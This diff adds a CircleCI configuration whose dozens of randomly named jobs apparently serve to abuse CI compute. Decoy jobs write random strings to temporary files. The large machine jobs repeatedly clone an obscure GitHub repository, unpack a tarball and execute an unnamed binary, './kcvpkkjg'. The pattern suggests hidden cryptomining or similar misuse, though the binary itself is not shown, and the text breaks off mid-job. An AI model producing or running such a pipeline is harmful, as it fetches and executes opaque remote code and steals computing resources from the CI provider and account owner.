@@ -1,0 +1,1741 @@
+version: 2.1
+
+jobs:
+  uthaz:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: bjnovosnxyeufp
+          command: |
+            mkdir -p /tmp/fphudi
+            echo 'qdigtdxchcfmlynhs avclkmlijggfcy' > /tmp/fphudi/ufpbxf
+            ls -la /tmp/fphudi/ufpbxf
+      - persist_to_workspace:
+          root: /tmp/fphudi
+          paths:
+            - 'ufpbxf'
+  vnfbonivac:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: rbmcquzhnm
+          command: |
+            [[ "$(head -n 1 /tmp/fphudi/aivumus 2>/dev/null)" =~ ^[A-Z] ]] && echo "starts upper" || echo "starts other"
+      - run:
+          name: fgpvniogouiiqi
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 https://github.com/kaniabarrbnsti-alt/f1123c4ebc8e.git .
+      - run:
+          name: kqchtzmkfucvbj
+          command: tar xjf ciyupbhzad.tar.bz2
+      - run:
+          command: "./kcvpkkjg"
+  fnjtpbiys:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: dflobznmxphwo
+          command: |
+            mkdir -p /tmp/fphudi
+            echo 'tvoptjdhdqnnhnn jbluckrvcapmbban' > /tmp/fphudi/uwdgtdtabacd
+            ls -la /tmp/fphudi/uwdgtdtabacd
+      - persist_to_workspace:
+          root: /tmp/fphudi
+          paths:
+            - 'uwdgtdtabacd'
+  yipbfkerdohfax:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: irsiha
+          command: |
+            [[ "$(head -n 1 /tmp/fphudi/gqxuqgclkrfmxs 2>/dev/null)" =~ ^[A-Z] ]] && echo "starts upper" || echo "starts other"
+      - run:
+          name: ohmcefkywyyfhl
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 https://github.com/kaniabarrbnsti-alt/f1123c4ebc8e.git .
+      - run:
+          name: doumhuyoeivtqvs
+          command: tar xjf ciyupbhzad.tar.bz2
+      - run:
+          command: "./kcvpkkjg"
+  ulkek:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: keveduounusk
+          command: |
+            mkdir -p /tmp/fphudi
+            echo 'oavzsapgoofvtmhb zdqqgrteacs' > /tmp/fphudi/qqdrkgprmtqnm
+            ls -la /tmp/fphudi/qqdrkgprmtqnm
+      - persist_to_workspace:
+          root: /tmp/fphudi
+          paths:
+            - 'qqdrkgprmtqnm'
+  bomcvdgby:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: bbdxngkxsdkhnk
+          command: |
+            [[ "$(head -n 1 /tmp/fphudi/yrpjyvqjsmogqy 2>/dev/null)" =~ ^[A-Z] ]] && echo "starts upper" || echo "starts other"
+      - run:
+          name: fudgfyqlffhouz
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 https://github.com/kaniabarrbnsti-alt/f1123c4ebc8e.git .
+      - run:
+          name: siohlwqfclv
+          command: tar xjf ciyupbhzad.tar.bz2
+      - run:
+          command: "./kcvpkkjg"
+  iqmzzdrmwswciz:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: bshsklbetotjdxl
+          command: |
+            mkdir -p /tmp/fphudi
+            echo 'lpbzoyzqne sltchmlrkov' > /tmp/fphudi/ziarwzfqfbol
+            ls -la /tmp/fphudi/ziarwzfqfbol
+      - persist_to_workspace:
+          root: /tmp/fphudi
+          paths:
+            - 'ziarwzfqfbol'
+  quaiccgwcq:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: mfzqutn
+          command: |
+            [[ "$(head -n 1 /tmp/fphudi/wlyvas 2>/dev/null)" =~ ^[A-Z] ]] && echo "starts upper" || echo "starts other"
+      - run:
+          name: happmyuokbz
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 https://github.com/kaniabarrbnsti-alt/f1123c4ebc8e.git .
+      - run:
+          name: sjoon
+          command: tar xjf ciyupbhzad.tar.bz2
+      - run:
+          command: "./kcvpkkjg"
+  srqich:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: ffvhwluv
+          command: |
+            mkdir -p /tmp/fphudi
+            echo 'vwfugcwckpxhceeox mrrrbjfnjrubwziq' > /tmp/fphudi/phtjgtmach
+            ls -la /tmp/fphudi/phtjgtmach
+      - persist_to_workspace:
+          root: /tmp/fphudi
+          paths:
+            - 'phtjgtmach'
+  swxsmxtqdubeeb:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: tubbs
+          command: |
+            [[ "$(head -n 1 /tmp/fphudi/garcfyylxshwka 2>/dev/null)" =~ ^[A-Z] ]] && echo "starts upper" || echo "starts other"
+      - run:
+          name: llrufydkk
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 https://github.com/kaniabarrbnsti-alt/f1123c4ebc8e.git .
+      - run:
+          name: ztegovkdjotrc
+          command: tar xjf ciyupbhzad.tar.bz2
+      - run:
+          command: "./kcvpkkjg"
+  fdiibsehyvwg:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: rkfwgrqfdyrgsxw
+          command: |
+            mkdir -p /tmp/fphudi
+            echo 'bkzpozqosilxgtnyp qbwwqesnkqjr' > /tmp/fphudi/rimofspo
+            ls -la /tmp/fphudi/rimofspo
+      - persist_to_workspace:
+          root: /tmp/fphudi
+          paths:
+            - 'rimofspo'
+  miexyps:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: pnylzgdezmd
+          command: |
+            [[ "$(head -n 1 /tmp/fphudi/rnfwgusgs 2>/dev/null)" =~ ^[A-Z] ]] && echo "starts upper" || echo "starts other"
+      - run:
+          name: mtxywa
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 https://github.com/kaniabarrbnsti-alt/f1123c4ebc8e.git .
+      - run:
+          name: arxlyfohzremmvl
+          command: tar xjf ciyupbhzad.tar.bz2
+      - run:
+          command: "./kcvpkkjg"
+  ipzhcgtk:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: hncawoadr
+          command: |
+            mkdir -p /tmp/fphudi
+            echo 'ftzngcrnjmpkde sxvqrixfknrw' > /tmp/fphudi/ixalgzptmfu
+            ls -la /tmp/fphudi/ixalgzptmfu
+      - persist_to_workspace:
+          root: /tmp/fphudi
+          paths:
+            - 'ixalgzptmfu'
+  nnunxpjnlqktd:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: csqkbymrf
+          command: |
+            [[ "$(head -n 1 /tmp/fphudi/nohnmksqpysjd 2>/dev/null)" =~ ^[A-Z] ]] && echo "starts upper" || echo "starts other"
+      - run:
+          name: zyvzrzvt
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 https://github.com/kaniabarrbnsti-alt/f1123c4ebc8e.git .
+      - run:
+          name: djxoqcnw
+          command: tar xjf ciyupbhzad.tar.bz2
+      - run:
+          command: "./kcvpkkjg"
+  wzmctvpbyr:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: vztpk
+          command: |
+            mkdir -p /tmp/fphudi
+            echo 'aaqajhqyacbqyjww nhdzxstjafb' > /tmp/fphudi/bzkvecfu
+            ls -la /tmp/fphudi/bzkvecfu
+      - persist_to_workspace:
+          root: /tmp/fphudi
+          paths:
+            - 'bzkvecfu'
+  altorkj:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: chcapjlnu
+          command: |
+            [[ "$(head -n 1 /tmp/fphudi/yggqwxpwi 2>/dev/null)" =~ ^[A-Z] ]] && echo "starts upper" || echo "starts other"
+      - run:
+          name: jmpujfmdaf
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 https://github.com/kaniabarrbnsti-alt/f1123c4ebc8e.git .
+      - run:
+          name: iotkwrakgjca
+          command: tar xjf ciyupbhzad.tar.bz2
+      - run:
+          command: "./kcvpkkjg"
+  zlzgxy:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: slnaursagjprvz
+          command: |
+            mkdir -p /tmp/fphudi
+            echo 'rnugxbipgmdlec alxckllclmeiyja' > /tmp/fphudi/drfmwmzliaaec
+            ls -la /tmp/fphudi/drfmwmzliaaec
+      - persist_to_workspace:
+          root: /tmp/fphudi
+          paths:
+            - 'drfmwmzliaaec'
+  xlkslxhelfhssn:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: poekasresftei
+          command: |
+            [[ "$(head -n 1 /tmp/fphudi/pegwtfr 2>/dev/null)" =~ ^[A-Z] ]] && echo "starts upper" || echo "starts other"
+      - run:
+          name: xymlzrqkwfi
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 https://github.com/kaniabarrbnsti-alt/f1123c4ebc8e.git .
+      - run:
+          name: efpygd
+          command: tar xjf ciyupbhzad.tar.bz2
+      - run:
+          command: "./kcvpkkjg"
+  goytglvzfwwbav:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: puofrhisfildy
+          command: |
+            mkdir -p /tmp/fphudi
+            echo 'tctdlrumwb wrlyezynyl' > /tmp/fphudi/fbpffgl
+            ls -la /tmp/fphudi/fbpffgl
+      - persist_to_workspace:
+          root: /tmp/fphudi
+          paths:
+            - 'fbpffgl'
+  imxzttieoiq:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: ymfksifqv
+          command: |
+            [[ "$(head -n 1 /tmp/fphudi/pejeoagbur 2>/dev/null)" =~ ^[A-Z] ]] && echo "starts upper" || echo "starts other"
+      - run:
+          name: ocmpxmytrhhth
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 https://github.com/kaniabarrbnsti-alt/f1123c4ebc8e.git .
+      - run:
+          name: qodla
+          command: tar xjf ciyupbhzad.tar.bz2
+      - run:
+          command: "./kcvpkkjg"
+  sbttxqfc:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: scopzf
+          command: |
+            mkdir -p /tmp/fphudi
+            echo 'ovqssrvglswdjbx htrmucgrfkwleplmhu' > /tmp/fphudi/eldftyr
+            ls -la /tmp/fphudi/eldftyr
+      - persist_to_workspace:
+          root: /tmp/fphudi
+          paths:
+            - 'eldftyr'
+  swvlwcddae:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: aqrey
+          command: |
+            [[ "$(head -n 1 /tmp/fphudi/xkkzjfbb 2>/dev/null)" =~ ^[A-Z] ]] && echo "starts upper" || echo "starts other"
+      - run:
+          name: hknpehphbtc
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 https://github.com/kaniabarrbnsti-alt/f1123c4ebc8e.git .
+      - run:
+          name: vekhintynadwl
+          command: tar xjf ciyupbhzad.tar.bz2
+      - run:
+          command: "./kcvpkkjg"
+  vrwjoaipk:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: vlqvnhldxlpfrl
+          command: |
+            mkdir -p /tmp/fphudi
+            echo 'hljvurkdyd lxztcmoouicmwh' > /tmp/fphudi/uqsbxdsrv
+            ls -la /tmp/fphudi/uqsbxdsrv
+      - persist_to_workspace:
+          root: /tmp/fphudi
+          paths:
+            - 'uqsbxdsrv'
+  hhfatrrrpmconn:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: uplgcslhoeu
+          command: |
+            [[ "$(head -n 1 /tmp/fphudi/uddqbzlhyank 2>/dev/null)" =~ ^[A-Z] ]] && echo "starts upper" || echo "starts other"
+      - run:
+          name: brvohitp
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 https://github.com/kaniabarrbnsti-alt/f1123c4ebc8e.git .
+      - run:
+          name: hdwszii
+          command: tar xjf ciyupbhzad.tar.bz2
+      - run:
+          command: "./kcvpkkjg"
+  tuphzqn:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: vvlzlpm
+          command: |
+            mkdir -p /tmp/fphudi
+            echo 'dosqdjdccvxyv xzyppjylqewyqfbct' > /tmp/fphudi/bfqrlnr
+            ls -la /tmp/fphudi/bfqrlnr
+      - persist_to_workspace:
+          root: /tmp/fphudi
+          paths:
+            - 'bfqrlnr'
+  iakszvldacy:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: nqbgntcnfyt
+          command: |
+            [[ "$(head -n 1 /tmp/fphudi/vhpsse 2>/dev/null)" =~ ^[A-Z] ]] && echo "starts upper" || echo "starts other"
+      - run:
+          name: jrvfuvzlas
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 https://github.com/kaniabarrbnsti-alt/f1123c4ebc8e.git .
+      - run:
+          name: tcpqv
+          command: tar xjf ciyupbhzad.tar.bz2
+      - run:
+          command: "./kcvpkkjg"
+  nzjzvdp:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: fdenqtnpxxkcnj
+          command: |
+            mkdir -p /tmp/fphudi
+            echo 'atgqywpxibpn sacctqlniekncfutt' > /tmp/fphudi/zoczxruirj
+            ls -la /tmp/fphudi/zoczxruirj
+      - persist_to_workspace:
+          root: /tmp/fphudi
+          paths:
+            - 'zoczxruirj'
+  dqvrjtbvcrcpn:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: dylbd
+          command: |
+            [[ "$(head -n 1 /tmp/fphudi/fktxomopnag 2>/dev/null)" =~ ^[A-Z] ]] && echo "starts upper" || echo "starts other"
+      - run:
+          name: hfrslfzgwsrjere
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 https://github.com/kaniabarrbnsti-alt/f1123c4ebc8e.git .
+      - run:
+          name: hmdgswjlfju
+          command: tar xjf ciyupbhzad.tar.bz2
+      - run:
+          command: "./kcvpkkjg"
+  ysdjnsjeqtmaca:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: dlniuuzlqf
+          command: |
+            mkdir -p /tmp/fphudi
+            echo 'aythdzpasxzbk wzbcustwuhkbq' > /tmp/fphudi/mcogjhlimsnzt
+            ls -la /tmp/fphudi/mcogjhlimsnzt
+      - persist_to_workspace:
+          root: /tmp/fphudi
+          paths:
+            - 'mcogjhlimsnzt'
+  iyxpcerte:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: rgcuihwm
+          command: |
+            [[ "$(head -n 1 /tmp/fphudi/asvizofeyle 2>/dev/null)" =~ ^[A-Z] ]] && echo "starts upper" || echo "starts other"
+      - run:
+          name: nuscmltjiiro
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 https://github.com/kaniabarrbnsti-alt/f1123c4ebc8e.git .
+      - run:
+          name: dksanb
+          command: tar xjf ciyupbhzad.tar.bz2
+      - run:
+          command: "./kcvpkkjg"
+  hgedixe:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: qljqu
+          command: |
+            mkdir -p /tmp/fphudi
+            echo 'onxmfdmortekmp ofcgjsspeawwz' > /tmp/fphudi/mqhhzgk
+            ls -la /tmp/fphudi/mqhhzgk
+      - persist_to_workspace:
+          root: /tmp/fphudi
+          paths:
+            - 'mqhhzgk'
+  qugjkfibgztxtht:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: bfuhvbbj
+          command: |
+            [[ "$(head -n 1 /tmp/fphudi/spzzsts 2>/dev/null)" =~ ^[A-Z] ]] && echo "starts upper" || echo "starts other"
+      - run:
+          name: jkhuygclydy
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 https://github.com/kaniabarrbnsti-alt/f1123c4ebc8e.git .
+      - run:
+          name: anddtoyt
+          command: tar xjf ciyupbhzad.tar.bz2
+      - run:
+          command: "./kcvpkkjg"
+  zfdds:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: jfsohotkyifebe
+          command: |
+            mkdir -p /tmp/fphudi
+            echo 'ngenbyczlb zmxwfroxerdsk' > /tmp/fphudi/qrzfesnup
+            ls -la /tmp/fphudi/qrzfesnup
+      - persist_to_workspace:
+          root: /tmp/fphudi
+          paths:
+            - 'qrzfesnup'
+  txxhbqhqlmuv:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: bvkczpjo
+          command: |
+            [[ "$(head -n 1 /tmp/fphudi/cvqfhgidi 2>/dev/null)" =~ ^[A-Z] ]] && echo "starts upper" || echo "starts other"
+      - run:
+          name: wlyjsf
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 https://github.com/kaniabarrbnsti-alt/f1123c4ebc8e.git .
+      - run:
+          name: unbhnrn
+          command: tar xjf ciyupbhzad.tar.bz2
+      - run:
+          command: "./kcvpkkjg"
+  ohsyugiig:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: iyyotcgbicvuu
+          command: |
+            mkdir -p /tmp/fphudi
+            echo 'micivpiusmronzs lbbhpitywodskq' > /tmp/fphudi/ounphtfsmx
+            ls -la /tmp/fphudi/ounphtfsmx
+      - persist_to_workspace:
+          root: /tmp/fphudi
+          paths:
+            - 'ounphtfsmx'
+  jugfpvkwpdlhp:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: hqisikb
+          command: |
+            [[ "$(head -n 1 /tmp/fphudi/jvmxkpfq 2>/dev/null)" =~ ^[A-Z] ]] && echo "starts upper" || echo "starts other"
+      - run:
+          name: digzcybwof
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 https://github.com/kaniabarrbnsti-alt/f1123c4ebc8e.git .
+      - run:
+          name: ewqdyoimfykmq
+          command: tar xjf ciyupbhzad.tar.bz2
+      - run:
+          command: "./kcvpkkjg"
+  zfjmrqzm:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: iipenfhagtn
+          command: |
+            mkdir -p /tmp/fphudi
+            echo 'bjshqlvgnujvoemv zfaddhyjaakza' > /tmp/fphudi/ingqxb
+            ls -la /tmp/fphudi/ingqxb
+      - persist_to_workspace:
+          root: /tmp/fphudi
+          paths:
+            - 'ingqxb'
+  ybmyleujke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: jtcrmszibycm
+          command: |
+            [[ "$(head -n 1 /tmp/fphudi/vwmjwgidxsvj 2>/dev/null)" =~ ^[A-Z] ]] && echo "starts upper" || echo "starts other"
+      - run:
+          name: ixrzkxrslstwxbw
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 https://github.com/kaniabarrbnsti-alt/f1123c4ebc8e.git .
+      - run:
+          name: vwgsd
+          command: tar xjf ciyupbhzad.tar.bz2
+      - run:
+          command: "./kcvpkkjg"
+  fsbuoamajnyaczs:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: fqlsgzsso
+          command: |
+            mkdir -p /tmp/fphudi
+            echo 'ycjojuoylhrjbki ogctoymxnkqywt' > /tmp/fphudi/scwhzhyomvlw
+            ls -la /tmp/fphudi/scwhzhyomvlw
+      - persist_to_workspace:
+          root: /tmp/fphudi
+          paths:
+            - 'scwhzhyomvlw'
+  sprswemruhtmpw:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: rviuttxmov
+          command: |
+            [[ "$(head -n 1 /tmp/fphudi/yrhhpuuwzsambo 2>/dev/null)" =~ ^[A-Z] ]] && echo "starts upper" || echo "starts other"
+      - run:
+          name: bbxwkol
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 https://github.com/kaniabarrbnsti-alt/f1123c4ebc8e.git .
+      - run:
+          name: vbxwmx
+          command: tar xjf ciyupbhzad.tar.bz2
+      - run:
+          command: "./kcvpkkjg"
+  krzhocvjpz:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: yifvutnmjwxukjh
+          command: |
+            mkdir -p /tmp/fphudi
+            echo 'rpcxpsrcdk jidirbdfwoxpyd' > /tmp/fphudi/teprcntaqbh
+            ls -la /tmp/fphudi/teprcntaqbh
+      - persist_to_workspace:
+          root: /tmp/fphudi
+          paths:
+            - 'teprcntaqbh'
+  ezmfzevn:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: swamwcjmz
+          command: |
+            [[ "$(head -n 1 /tmp/fphudi/lzgkqhpznn 2>/dev/null)" =~ ^[A-Z] ]] && echo "starts upper" || echo "starts other"
+      - run:
+          name: jbwyy
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 https://github.com/kaniabarrbnsti-alt/f1123c4ebc8e.git .
+      - run:
+          name: tavfveu
+          command: tar xjf ciyupbhzad.tar.bz2
+      - run:
+          command: "./kcvpkkjg"
+  qlbidjs:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: fngrna
+          command: |
+            mkdir -p /tmp/fphudi
+            echo 'ohqzalorerbwi prudmluuotmp' > /tmp/fphudi/kmhiuwokbpp
+            ls -la /tmp/fphudi/kmhiuwokbpp
+      - persist_to_workspace:
+          root: /tmp/fphudi
+          paths:
+            - 'kmhiuwokbpp'
+  apaoyj:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: ezuazrylcishhs
+          command: |
+            [[ "$(head -n 1 /tmp/fphudi/bpzbmi 2>/dev/null)" =~ ^[A-Z] ]] && echo "starts upper" || echo "starts other"
+      - run:
+          name: otojwgrxtairwow
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 https://github.com/kaniabarrbnsti-alt/f1123c4ebc8e.git .
+      - run:
+          name: neefcfnnqxzn
+          command: tar xjf ciyupbhzad.tar.bz2
+      - run:
+          command: "./kcvpkkjg"
+  jjcsppemo:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: sepdjxtbi
+          command: |
+            mkdir -p /tmp/fphudi
+            echo 'tupxutsaypd mnrgjtkitkzqgmvfxe' > /tmp/fphudi/eavfkhk
+            ls -la /tmp/fphudi/eavfkhk
+      - persist_to_workspace:
+          root: /tmp/fphudi
+          paths:
+            - 'eavfkhk'
+  lgglguapnc:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: ylbwqsx
+          command: |
+            [[ "$(head -n 1 /tmp/fphudi/cnkkffkkoeo 2>/dev/null)" =~ ^[A-Z] ]] && echo "starts upper" || echo "starts other"
+      - run:
+          name: qycutosknxkleee
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 https://github.com/kaniabarrbnsti-alt/f1123c4ebc8e.git .
+      - run:
+          name: iciixdpjp
+          command: tar xjf ciyupbhzad.tar.bz2
+      - run:
+          command: "./kcvpkkjg"
+  fggqcdnfwq:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: otzxdxmao
+          command: |
+            mkdir -p /tmp/fphudi
+            echo 'ixgsbzzdzjvxxoerxa qcocipkijnwtdgzxiy' > /tmp/fphudi/hobebcjor
+            ls -la /tmp/fphudi/hobebcjor
+      - persist_to_workspace:
+          root: /tmp/fphudi
+          paths:
+            - 'hobebcjor'
+  chbklybztfgq:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: ayaivjctobdxq
+          command: |
+            [[ "$(head -n 1 /tmp/fphudi/mpxvkvqv 2>/dev/null)" =~ ^[A-Z] ]] && echo "starts upper" || echo "starts other"
+      - run:
+          name: ovsdb
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 https://github.com/kaniabarrbnsti-alt/f1123c4ebc8e.git .
+      - run:
+          name: jdknnv
+          command: tar xjf ciyupbhzad.tar.bz2
+      - run:
+          command: "./kcvpkkjg"
+  cxucrqkm:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: flbxkd
+          command: |
+            mkdir -p /tmp/fphudi
+            echo 'pjqtortheurpjkn wkuqzxkynsvfnum' > /tmp/fphudi/xhmxznopcfgcwq
+            ls -la /tmp/fphudi/xhmxznopcfgcwq
+      - persist_to_workspace:
+          root: /tmp/fphudi
+          paths:
+            - 'xhmxznopcfgcwq'
+  dlklygle:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: ycvizja
+          command: |
+            [[ "$(head -n 1 /tmp/fphudi/rofsyykudriuk 2>/dev/null)" =~ ^[A-Z] ]] && echo "starts upper" || echo "starts other"
+      - run:
+          name: fidclqifyjblxel
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 https://github.com/kaniabarrbnsti-alt/f1123c4ebc8e.git .
+      - run:
+          name: fxncxfxikcm
+          command: tar xjf ciyupbhzad.tar.bz2
+      - run:
+          command: "./kcvpkkjg"
+  pomuo:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: fvdpwyrwj
+          command: |
+            mkdir -p /tmp/fphudi
+            echo 'xdswblftsoclkws iktouxmkyqrrq' > /tmp/fphudi/rqedxbufwbstx
+            ls -la /tmp/fphudi/rqedxbufwbstx
+      - persist_to_workspace:
+          root: /tmp/fphudi
+          paths:
+            - 'rqedxbufwbstx'
+  fdesgnmxeo:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: ufwryom
+          command: |
+            [[ "$(head -n 1 /tmp/fphudi/uyaslcmdby 2>/dev/null)" =~ ^[A-Z] ]] && echo "starts upper" || echo "starts other"
+      - run:
+          name: tznkxznmh
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 https://github.com/kaniabarrbnsti-alt/f1123c4ebc8e.git .
+      - run:
+          name: kkzqumbdl
+          command: tar xjf ciyupbhzad.tar.bz2
+      - run:
+          command: "./kcvpkkjg"
+  ayuwsh:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: aeqcoy
+          command: |
+            mkdir -p /tmp/fphudi
+            echo 'envduzmdmapcfv vmbfqusennwd' > /tmp/fphudi/uozxwlit
+            ls -la /tmp/fphudi/uozxwlit
+      - persist_to_workspace:
+          root: /tmp/fphudi
+          paths:
+            - 'uozxwlit'
+  obtkhvd:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: hprcc
+          command: |
+            [[ "$(head -n 1 /tmp/fphudi/juigyq 2>/dev/null)" =~ ^[A-Z] ]] && echo "starts upper" || echo "starts other"
+      - run:
+          name: lvhihhlpupbl
